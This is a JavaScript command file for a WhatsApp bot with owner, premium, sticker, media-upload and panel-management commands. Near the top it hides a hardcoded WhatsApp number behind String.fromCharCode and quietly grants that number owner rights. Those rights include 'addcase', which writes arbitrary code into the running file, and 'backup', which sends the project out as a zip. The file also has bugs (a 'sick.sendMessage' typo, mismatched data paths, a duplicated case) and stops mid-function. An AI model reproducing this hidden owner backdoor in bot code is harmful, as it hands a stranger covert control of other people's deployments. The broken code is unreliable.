/*
    # Credits:
    BASE BY : CODEBREAKER 
  https://wa.me/2347030627048
  
 DONT REMOVE CREDIT!!!!!!
*/
process.on("uncaughtException", (err) => {
console.error("Caught exception:", err);
});

import { 
    generateWAMessageFromContent, 
    proto, 
    prepareWAMessageMedia,
    downloadContentFromMessage
} from "@whiskeysockets/baileys"

import axios from "axios";
import FormData from "form-data";
import fs from "fs";
import path from "path";
import * as fsSync from "fs";  
import chalk from "chalk";
import { fileURLToPath, pathToFileURL } from "url";
import { exec, execSync, spawn } from "child_process";
import util from "util"; 
import { createCanvas, registerFont } from 'canvas';
import { performance } from "perf_hooks";
import os from "os";
import { fileTypeFromBuffer } from "file-type";
import yts from "yt-search"
import ytdl from '@vreden/youtube_scraper';

//=============================================//
const datagc = JSON.parse(fsSync.readFileSync("./data/reseller.json"))
export const fitur = JSON.parse(fsSync.readFileSync('./data/setbot.json')); 
const dataBot = path.join(process.cwd(), "data", "setbot.json");
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))
//=============================================//
export async function casesBot(sock, m, chatUpdate) {
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  ""
) || "";
try {
//=============================================//
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const globalPrefix = global.prefix || '.'; 
const isPrefixOn = global.multiprefix === true; 

let prefix = null;
let isCmd = false;

if (isPrefixOn) { 
    if (body.startsWith(globalPrefix)) {
        prefix = globalPrefix; 
        isCmd = true;
    }
 } else {
    if (body.length > 0) { 
        prefix = ''; 
        isCmd = true;
    }
}

// ** system for prefix **
const loadPrefixData = () => {
    if (fs.existsSync(dataBot)) {
        try {
            const dataPfx = fs.readFileSync(dataBot, 'utf-8');
            return JSON.parse(dataPfx);
        } catch (e) {
            console.error("Failed to read prefix data:", e);
            return {};
        }
    }
    return {};
};

const savePrefixData = (dataPfx) => {
    try {
        if (!fs.existsSync(path.dirname(dataBot))) {
             fs.mkdirSync(path.dirname(dataBot), { recursive: true });
        }
        fs.writeFileSync(dataBot, JSON.stringify(dataPfx, null, 2), 'utf-8');
    } catch (e) {
        console.error("Failed to save prefix data:", e);
    }
};

let {
savedPrefix = '.', 
multiPrefixStatus = false 
} = loadPrefixData();

global.prefix = savedPrefix;
global.multiprefix = multiPrefixStatus;

if (!fs.existsSync(dataBot)) {
    savePrefixData({ savedPrefix: global.prefix, multiPrefixStatus: global.multiprefix });
}

const updateAndSave = (newPrefix, newMultiStatus) => {
        global.prefix = newPrefix;
        global.multiprefix = newMultiStatus;
        
        savePrefixData({
            savedPrefix: newPrefix,
            multiPrefixStatus: newMultiStatus
        });
    };
    
//==============================================//

const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const text = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = quoted?.msg?.mimetype || quoted?.mimetype || null;
const qmsg = (m.quoted || m);
const q = body.trim().split(/ +/).slice(1).join(" ");
const botNumber = await sock.decodeJid(sock.user.id)

//=============================================//
const isGrupPrem = datagc.includes(m.chat)
const isWaz = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPrem = premium.includes(m.sender)

//=============================================//
// ** function for group chat **
const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);

const isBotAdmin = groupAdmins.includes(botNumber);
const isAdmin = groupAdmins.includes(m.sender);

//=============================================//
const reply = m.reply = async (teks) => {
  return sock.sendMessage(m.chat, {
    text: `${teks}`,
    mentions: [m.sender],
    contextInfo: {
      externalAdReply: {
        title: `${namaBot}`,
        body: `${global.ucapan()}`,
        thumbnailUrl: global.foto,
        sourceUrl: global.url,
      }
    }
  }, { quoted: m });
};

const example = (teks) => {
return `How to use:\n*${prefix+command}* ${teks}`
}

//=============================================//
// ** panel console.log design **
if (isCmd) {
  const from = m.key.remoteJid;
  const chatType = from.endsWith("@g.us") ? "GROUP" : "PRIVATE";
 
  const fullCommand = `${prefix}${command}`; 
  
  const logMessage = 
    chalk.bgCyan.white.bold(`\n [ COMMAND RECEIVED ] `) + 
    chalk.white(`\n • Message:   `) + chalk.yellow.bold(fullCommand) +
    chalk.white(`\n • Chat In:   `) + chalk.magenta(chatType) +
    chalk.white(`\n • Name:      `) + chalk.cyan(m.pushName || 'N/A') + 
    chalk.white(`\n • Sender ID: `) + chalk.blue(m.sender) + '\n';
  console.log(logMessage);
}

// ** fake quoted **
const qtxt = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net"
    },
    message: {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363400363337568@newsletter",
            newsletterName: "xcde",
            caption: `Created by ${namaOwner}`,
            inviteExpiration: "1757494779"
        }
    }
};

//=============================================//
// **All commands**
switch (command) {
case "menu": {
let teks = `Hello *${m.pushName}* 👋
I am *${global.namaBot}*, here is the menu of what I can do!

 *KNOX INFO* 
> Bot name : *${global.namaBot}*
> Developer : *${global.namaOwner}*
> Version : *${global.versi}*
> Runtime : *${runtime(process.uptime())}*
> Bot mode : ${fitur.public ? "*public mode*" : "*self mode*"}

┏⧉ *File Manager* 
┣𖣠 ${prefix}addcase
┣𖣠 ${prefix}listcase 
┣𖣠 ${prefix}getcase 
┗━━━━━━━━━━━━━❖
┏⧉ *Owners Menu* 
┣𖣠 ${prefix}backup 
┣𖣠 ${prefix}restart 
┣𖣠 ${prefix}clearsesion 
┣𖣠 ${prefix}public 
┣𖣠 ${prefix}private 
┣𖣠 ${prefix}mode 
┣𖣠 ${prefix}setprefix
┣𖣠 ${prefix}prefix
┣𖣠 ${prefix}delprefix
┣𖣠 ${prefix}addowner
┣𖣠 ${prefix}listowner 
┣𖣠 ${prefix}delowner
┣𖣠 ${prefix}addprem
┣𖣠 ${prefix}listprem
┣𖣠 ${prefix}delprem
┗━━━━━━━━━━━━━❖
┏⧉ *Other Menu* 
┣𖣠 ${prefix}sticker 
┣𖣠 ${prefix}tourl
┣𖣠 ${prefix}brat
┣𖣠 ${prefix}ping 
┣𖣠 ${prefix}owner
┣𖣠 ${prefix}totalfitur 
┣𖣠 ${prefix}cekidch
┗━━━━━━━━━━━━━❖
┏⧉ *Tools Menu 🛠️* 
┣𖣠 ${prefix}toimage 
┣𖣠 ${prefix}tovn
┗━━━━━━━━━━━━━❖
┏⧉ *Cpanel Menu* 
┣𖣠 ${prefix}1gb - 10gb 
┣𖣠 ${prefix}unli 
┣𖣠 ${prefix}listpanel 
┣𖣠 ${prefix}delpanel 
┣𖣠 ${prefix}cadmin 
┣𖣠 ${prefix}listadmin 
┣𖣠 ${prefix}deladmin
┣𖣠 ${prefix}clearpanel 
┣𖣠 ${prefix}addsrv
┣𖣠 ${prefix}addresseler 
┣𖣠 ${prefix}listresseler 
┣𖣠 ${prefix}delresseler 
┗━━━━━━━━━━━━━❖
┏⧉ *Cpanel Menu-V2* 
┣𖣠 ${prefix}1gbv2 - 10gbv2 
┣𖣠 ${prefix}unliv2 
┣𖣠 ${prefix}listpanelv2 
┣𖣠 ${prefix}delpanelv2 
┣𖣠 ${prefix}cadminv2 
┣𖣠 ${prefix}listadminv2 
┣𖣠 ${prefix}deladminv2
┣𖣠 ${prefix}clearpanelv2 
┣𖣠 ${prefix}addsrvv2
┣𖣠 ${prefix}addgrupseller
┣𖣠 ${prefix}listgrupreseller
┣𖣠 ${prefix}delgrupseler
┗━━━━━━━━━━━━━❖`;
await sock.sendMessage(m.chat, {
          text: `${teks}`,
          contextInfo: {
            mentionedJid: [m.sender],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
              newsletterJid: global.idCh,
              newsletterName: global.namaBot,
              },
              externalAdReply: {
                  title: global.namaBot,
                  body: `Hello welcome to bot!`,
                  thumbnailUrl: global.thumb,
                  sourceUrl: "",
                  mediaType: 1,
                  renderLargerThumbnail: true
              }
          }
      }, { quoted: m }
   );
}
break 

//** case file manager menu **
case 'listcase': {
    if (!isWaz) return m.reply(mess.owner);
      const listCase = async () => {
        let code = await fs.promises.readFile("./case.js", "utf8");
        code = code.replace(/\/\/.*$/gm, ""); 
        code = code.replace(/\/\*[\s\S]*?\*\//gm, ""); 
        const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
        const matches = [];
        let match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `Total Case Features (${matches.length})\n\n`;
        matches.forEach(x => {
            teks += `- ${x}\n`;
        });
        return teks;
    };
    reply(await listCase());
}
break;

case "getcase": {
if (!isWaz) return
if (!text) return m.reply(`Example: ${prefix}getcase menu`)
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* not found`)
}
}
break

case 'delcase': {
    if (!isWaz) return m.reply(mess.owner);
    if (!q) return reply(example(`The case name\n*${prefix}listcase* to see all cases`));
    const hapusCase = async (filePath, caseName) => {
        try {
            let data = await fs.promises.readFile(filePath, "utf8");
            const regex = new RegExp(`case\\s+['"\`]${caseName}['"\`]:[\\s\\S]*?break`, "g");
            const modifiedData = data.replace(regex, "");
            await fs.promises.writeFile(filePath, modifiedData, "utf8");
            console.log(`Case '${caseName}' successfully deleted from file.`);
        } catch (err) {
            console.error("An error occurred:", err);
        }
    };
    await hapusCase("./case.js", q); // adjust file name
    reply(`Successfully deleted case *${q}*`);
}
break;

case 'addcase': {
    if (!isWaz) return m.reply(mess.owner);
    if (!text) return m.reply(`Where is the code?\n\nExample usage:\n${prefix + command} case 'tes': m.reply('hello'); break`);

    const __filename = fileURLToPath(import.meta.url);

    try {
        const data = fs.readFileSync(__filename, 'utf-8');
        const marker = "case 'addcase':"; 
        const insertIndex = data.indexOf(marker);

        if (insertIndex === -1) {
            return m.reply("❌ Failed to find marker position 'addcase' in this file.");
        }

        const caseBaru = `\n// [NEW CASE ADDED @ ${new Date().toLocaleTimeString()}]\n${text}\n\n`;

        const finalCode = data.slice(0, insertIndex) + caseBaru + data.slice(insertIndex);

        fs.writeFileSync(__filename, finalCode, 'utf-8');

        m.reply("*Successfully added new case!*");

    } catch (err) {
        console.error(err);
        m.reply(`❌ An error occurred while saving: ${err.message}`);
    }
}
break;


// ** case owner menu **
case "ambilq": case "q": {
if (!isWaz) return
if (!m.quoted) return 
m.reply(JSON.stringify(m.quoted.fakeObj.message, null, 2))
}
break

case "bck": case "backup": {
    const sender = m.sender.split("@")[0];
    const isCreator = global.owner.includes(sender);
    
    if (!isCreator && m.sender !== botNumber) {
        return m.reply(mess.owner);
    }

    try {        
        m.reply("Processing Backup Script . .");
        const tmpDir = "./data/trash";
        if (fs.existsSync(tmpDir)) {
            try { 
                const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
                for (let file of files) fs.unlinkSync(`${tmpDir}/${file}`);
            } catch {}
        }

        const dateDisplay = typeof global.tanggal === 'function' ? global.tanggal(Date.now()) : new Date().toDateString();
        
        const safeDate = dateDisplay.replace(/[^a-zA-Z0-9]/g, '_');
        const name = `backup-${safeDate}`; 

        const exclude = ["node_modules", "Auth", "session", "package-lock.json", "yarn.lock", ".npm", ".cache", ".git", ".gitignore", "setbot.json"];
        
        const filesToZip = fs.readdirSync(process.cwd())
            .filter(f => !exclude.includes(f) && f !== "" && !f.endsWith(".zip"));

        if (!filesToZip.length) return m.reply("No files available for backup.");

        execSync(`zip -r "${name}.zip" ${filesToZip.join(" ")}`);

        const zipPath = `./${name}.zip`;
        const zipBuffer = fs.readFileSync(zipPath);

        await sock.sendMessage(m.sender, {
            document: zipBuffer,
            fileName: `${name}.zip`,
            caption: `*SUCCESS BACKUP SCRIPT*\n\n` +
                     `- 📅 Date: ${dateDisplay}\n` + 
                     `*💬 File safely saved.*`, 
            mimetype: "application/zip"
        }, { quoted: m });

        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        if (m.isGroup) m.reply("Bot script successfully sent to private chat.");

    } catch (err) {
        console.error("Backup Error:", err);
        m.reply(`❌ Backup Failed:\n${err.message}`);
    }
}
break;

case "rst": case "restart": {
  if (!isWaz) return reply(mess.owner);
  const restartServer = () => {
    const newProcess = spawn(process.argv[0], process.argv.slice(1), {
      detached: true,
      stdio: "inherit",
    });
    process.exit(0);
  };
  await reply(`\`\`\`[✓] Restarting bot . . .\`\`\``);
  setTimeout(() => restartServer(), 4500);
}
break 

case "clsesi": case "clearsesi": case "celearsesion": {
if (!isWaz) return reply(mess.owner)
  const pathAuth = "./Auth";
  const pathTrash = "./data/trash";

  if (!fs.existsSync(pathAuth)) fs.mkdirSync(pathAuth, { recursive: true });
  if (!fs.existsSync(pathTrash)) fs.mkdirSync(pathTrash, { recursive: true });
  const dirsesi = fs.readdirSync(pathAuth).filter(e => e !== "creds.json");
  const dirsampah = fs.readdirSync(pathTrash).filter(e => e !== "tmp");

  for (const file of dirsesi) {
    try {
      fs.unlinkSync(`${pathAuth}/${file}`);
    } catch (e) {
      console.error(`Failed to delete ${file}:`, e.message);
    }
  }

  for (const file of dirsampah) {
    try {
      fs.unlinkSync(`${pathTrash}/${file}`);
    } catch (e) {
      console.error(`Failed to delete ${file}:`, e.message);
    }
  }

  reply(`*Successfully cleaned trash ✅*
- *${dirsesi.length}* session trash
- *${dirsampah.length}* file trash`);
};
break 

//======================================//
case "addowner": case "addown": {
if (!isWaz) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("WHOSE NUMBER DO YOU WANT TO ADD AS OWNER?"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`NUMBER ${input2} IS ALREADY AN OWNER, NO NEED TO REQUEST ADDITION!`)
owners.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`YES, THEY'RE AN OWNER NOW, TELL THEM THEY'VE BEEN ADDED`)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("There are no additional owners")
let teks = `\n *乂 List of all additional owners*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break
case "delowner": case "delown": {
if (!isWaz) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("WHOSE NUMBER DO YOU WANT TO REMOVE AS OWNER?"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Cannot remove main owner!`)
if (!owners.includes(input)) return m.reply(`NUMBER ${input2} IS NOT AN OWNER!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`SUCCESSFULLY REMOVED OWNER`)
}
break

case "addprem": {
if (!isWaz) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("WHERE IS THE NUMBER?"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Number ${input2} is already premium!`)
premium.push(input)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`SUCCESSFULLY ADDED PREMIUM`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listprem": {
if (premium.length < 1) return m.reply("There are no reseller users")
let teks = `\n *乂 List of all panel resellers*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sick.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delprem": {
if (!isWaz) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("WHERE IS THE NUMBER?"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Cannot remove owner!`)
if (!premium.includes(input)) return m.reply(`Number ${input2} is not premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`SUCCESSFULLY REMOVED PREMIUM`)
}
break
//=====================================//


case "self": {
    if (!isWaz) return m.reply(mess.owner)
    fitur.public = false

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *self*")
    break
  }

  case "public": {
    if (!isWaz) return m.reply(mess.owner)
    fitur.public = true

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *public*")
    break
  }

  case "mode": {
    m.reply(
`*Bot mode status 🤖*
- Currently: *${fitur.public ? "Public mode" : "Self mode"}*

*Available Command ⚙️*
- ${prefix}self
- ${prefix}public`
    )
  }
break

case "setprefix": {
 if (!isWaz && !isPrem) return m.reply(mess.owner)
  if (!args[0]) {
   return m.reply(`*Usage Examples :*
› Use: ${prefix}${command} *[new prefix]*
› Example: ${prefix}${command} *🗿*

*To use:*
› Ex: ${prefix}prefix on`);
        }
        
        const newPrefix = args[0]; 
        updateAndSave(newPrefix, global.multiprefix);
        
        let modeStatus = global.multiprefix 
            ? `Prefix mode *ON*. Messages must start with *${newPrefix}*.` 
            : `Prefix mode *OFF*. Bot responds without prefix, but *${newPrefix}* is saved.`;

        return m.reply(`*Prefix successfully changed*

› New Prefix: *${newPrefix}*

*⚠️ Note:* ${modeStatus}`);
    }
break

case 'delprefix': {
        if (!isWaz && !isPrem) return m.reply(mess.owner)
        updateAndSave('.', global.multiprefix); 
        
        return m.reply(`Successfully reset prefix to default *"."* 

*Reset prefix settings:*
› Ex: *${prefix}setprefix*`);
}
break;

case 'prefix': {
    let type = args[0] ? args[0].toLowerCase() : '';

    switch (type) {
        case 'on':
            if (!isWaz) return m.reply(mess.owner);
            if (global.multiprefix) {
                return m.reply(`[✓] - *Already active!*

*Prefix info :*
› Active prefix: ${global.prefix || '*.*'}

*Reset prefix settings:*
› Ex: *${prefix}setprefix*`);
            }
            
            updateAndSave(global.prefix, true);

            return m.reply(`[✓] - *Successfully activated prefix!*

*Prefix info :*
› Active prefix: ${global.prefix || '*.*'}

*Reset prefix settings:*
› Ex: *${prefix}setprefix*`);

        case 'off':
            if (!isWaz) return m.reply(mess.owner);
            if (!global.multiprefix) {
                return m.reply(`[✓] - *Already in offline mode*
*Prefix info :*
› Active prefix: *no prefix*`);
            }
            
            updateAndSave(global.prefix, false);

            return m.reply(`[✓] - *Offline prefix mode!*

*Prefix info :*
› Active prefix: *no prefix*`);

        default:
            if (!isWaz) return m.reply(mess.owner);
            let status = global.multiprefix ? 'ON' : 'OFF';
            let savedPrefixDisplay = global.prefix || '**.**';
            let activePrefix = global.multiprefix ? savedPrefixDisplay : 'no prefix!'; 
            
            let helpMessage = `*Prefix Settings ⚙️*
› Prefix mode: *${status}*
› Saved prefix: *${savedPrefixDisplay}*
› Active prefix: *${activePrefix}*

*Available Commands ✅*
› *${prefix}prefix on* /use saved prefix 
› *${prefix}prefix off* /no prefix mode 
› *${prefix}setprefix* /custom new prefix
› *${prefix}delprefix* /reset prefix`;
            m.reply(helpMessage);
    }
}
break

// ** case other menu **
case 'totalfitur': case 'listcase': {
    const __filename = fileURLToPath(import.meta.url);
    const scriptContent = fs.readFileSync(__filename, 'utf-8');
    const casePattern = /case\s+['"]([^'"]+)['"]/g;
    const matches = scriptContent.match(casePattern);
    const total = matches ? matches.length : 0;

    m.reply(`🤖 *${global.namaBot}* has a total of *${total}* features`);
}
break;

case "s": case "sticker": case "stiker": {
  if (!/image|video/.test(mime))
    return reply(`Send or reply to a photo/video with caption *${prefix + command}*`);

  if (/video/.test(mime)) {
    if ((qmsg.seconds || 0) > 15)
      return reply("Maximum video duration is 15 seconds!");
  }

  try {
    const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);

    await sock.sendImageAsSticker(
      m.chat,
      mediaPath,
      m,
      { author: "Create by wazofc" }
    );

    // delete temporary file
    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error(err);
    reply("❌ Failed to create sticker!");
  }
}
break 

case "brat": {
  if (!text) return m.reply(`Example: ${prefix}brat hi`)
  if (text.length > 250) return m.reply(`Character limit, max 250!`)

  const encode = encodeURIComponent(text)
  const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

  await sock.sendImageAsSticker(m.chat, jion, m, {
    packname: "Create By wazzOfc",
    author: "WazzOfc",
  })
}
break

case 'tourl': case 'reurl': case 'urlmaker': {
  const q = m.quoted ? m.quoted : m;
  if (!/image|video|audio|application/.test(mime)) {
    return m.reply("Reply to media (photo/video/audio/document) to upload to Catbox!");
  }

  let mediaPath = null;
  try {
    m.reply("Wait...");
    mediaPath = await sock.downloadAndSaveMediaMessage(q);
    if (!mediaPath) return m.reply("Failed to get media.");
    const buffer = fs.readFileSync(mediaPath);
    const { fileTypeFromBuffer } = await import("file-type");
    const type = await fileTypeFromBuffer(buffer);
    const ext = type?.ext || "bin";
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: `file.${ext}`,
      contentType: type?.mime || "application/octet-stream"
    });
    
    const res = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders()
    });

    const url = res.data.trim();

    if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);

    if (url.startsWith("http")) {
      m.reply(`*UPLOAD SUCCESSFUL*\n\n❖ URL: ${url}`);
    } else {
      m.reply(`Upload result: ${url}`);
    }

  } catch (e) {
    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    console.error(e);
    m.reply("❌ Error: " + e.message);
  }
}
break;

case "cekidch":
        {
          if (!text) {
            return m.reply(example("where is the channel link"));
          }
          if (!text.includes("https://whatsapp.com/channel/")) {
            return m.reply("Invalid link");
          }
          let result = text.split("https://whatsapp.com/channel/")[1];
          let res = await sock.newsletterMetadata("invite", result);
          let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}`;
          let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                  body: {
                    text: teks
                  },
                  footer: {
                    text: "powered by Wazz"
                  },
                  //input watermark footer
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_copy",
                      buttonParamsJson: `{"display_text": "copy ID","copy_code": "${res.id}"}`
                    }]
                  }
                }
              }
            }
          }, {
            quoted: m
          });
          await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        }
        break;


case "ping": case "os": {
    try {
        const THEME = {
            bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
            primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
            purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
            textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
        };

        const formatSize = (bytes) => {
            if (bytes === 0) return '0 B';
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
        };

        const formatTime = (seconds) => {
            seconds = Number(seconds);
            const d = Math.floor(seconds / (3600 * 24));
            const h = Math.floor(seconds % (3600 * 24) / 3600);
            const m = Math.floor(seconds % 3600 / 60);
            const s = Math.floor(seconds % 60);
            if (d > 0) return `${d}d ${h}h ${m}m`;
            if (h > 0) return `${h}h ${m}m`;
            return `${m}m ${s}s`;
        };

        function drawBackground(ctx, w, h) {
            const gradient = ctx.createLinearGradient(0, 0, w, h);
            gradient.addColorStop(0, THEME.bg);
            gradient.addColorStop(0.5, THEME.bgSecondary);
            gradient.addColorStop(1, THEME.bg);
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, w, h);
            ctx.globalAlpha = 0.02;
            for (let i = 0; i < 100; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const size = Math.random() * 2;
                ctx.fillStyle = THEME.textPrimary;
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI * 2);
                ctx.fill();
            }
            ctx.globalAlpha = 1;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            for (let i = 0; i < w; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
            }
            for (let i = 0; i < h; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
            }
            ctx.globalAlpha = 1;
        }

        function drawCard(ctx, x, y, w, h, radius) {
            ctx.save();
            ctx.shadowColor = THEME.glow;
            ctx.shadowBlur = 15;
            ctx.beginPath();
            ctx.roundRect(x, y, w, h, radius);
            ctx.fillStyle = THEME.card;
            ctx.fill();
            ctx.shadowBlur = 0;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
        }

        function drawIcon(ctx, x, y, type, color) {
            ctx.save();
            ctx.strokeStyle = color;
            ctx.fillStyle = color;
            ctx.lineWidth = 2.5;
            ctx.lineCap = 'round';
            ctx.lineJoin = 'round';
            switch (type) {
                case 'cpu':
                    ctx.strokeRect(x - 12, y - 12, 24, 24);
                    ctx.fillRect(x - 6, y - 6, 12, 12);
                    ctx.beginPath();
                    ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                    ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                    ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                    ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                    ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                    ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                    ctx.stroke();
                    break;
                case 'memory':
                    for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                    break;
                case 'disk':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                    break;
                case 'network':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                    ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.fill();
                    break;
                case 'server':
                    for (let i = 0; i < 3; i++) {
                        ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                        ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                    }
                    break;
                case 'clock':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                    ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                    break;
            }
            ctx.restore();
        }

        function drawLogo(ctx, x, y, size) {
            ctx.save();
            const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
            gradient.addColorStop(0, THEME.primary);
            gradient.addColorStop(0.5, THEME.cyan);
